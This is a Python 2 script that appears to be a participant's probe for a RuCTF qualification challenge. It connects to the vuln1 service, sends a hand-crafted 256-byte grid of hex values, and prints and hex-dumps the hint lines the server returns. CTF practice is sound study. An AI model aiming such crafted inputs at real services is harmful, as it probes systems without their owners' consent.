__author__ = 'HuyNA'
import os
import socket
import time
import struct
import sys
import base64
"""
    vuln1.quals.ructf.org:16712 binary
    Flag format is "RUCTF_.*".
"""
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "vuln1.quals.ructf.org"
local_host="192.168.248.157"
port = 16712
s.connect((host, port))
#s.connect((local_host, 4545))

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf

print recv_until(s, "> ")
row  = "\xff"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row1 = "\x97"+"\x01"+"\x0B"+"\xa1"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row2 = "\xab"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row3 = "\xab"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row4 = "\xab"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row5 = "\xff"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row6 = "\xff"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x1f"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row7 = "\xff"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row8 = "\xff"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row9 = "\xff"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row10 = "\xff"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row11 = "\xab"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row12 = "\xab"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row13 = "\xab"+"\x8d"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row14 = "\xab"+"\x01"+"\x0B"+"\x01"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"
row15 = "\xab"+"\x01"+"\x0B"+"\x15"+"\x1f"+"\x29"+"\x33"+"\x3D"+"\x47"+"\x51"+"\x5B"+"\x65"+"\x6f"+"\x79"+"\x83"+"\x8D"


send_data = row+row1+row2+row3+row4+row5+row6+row7+row8+row9+row10+row11+row12+row13+row14+row15+"\n"
print send_data
s.send(send_data)
time.sleep(0.01)
hint_buffer = []
size_buffer = 0
print recv_until(s, "have a hint:\n")
for i in xrange(16):
    hint_buffer.append(recv_until(s, "\n"))
    print hint_buffer[i],
    print " ",
    size_buffer += len(hint_buffer[i])
    print len(hint_buffer[i]),
    print " ",
    print i

print s.recv(1024)

print size_buffer

for i in xrange(16):
    print i,
    print hint_buffer[i].encode("hex")



# \x1B[4%dm
# \x1B[3%d;4%dm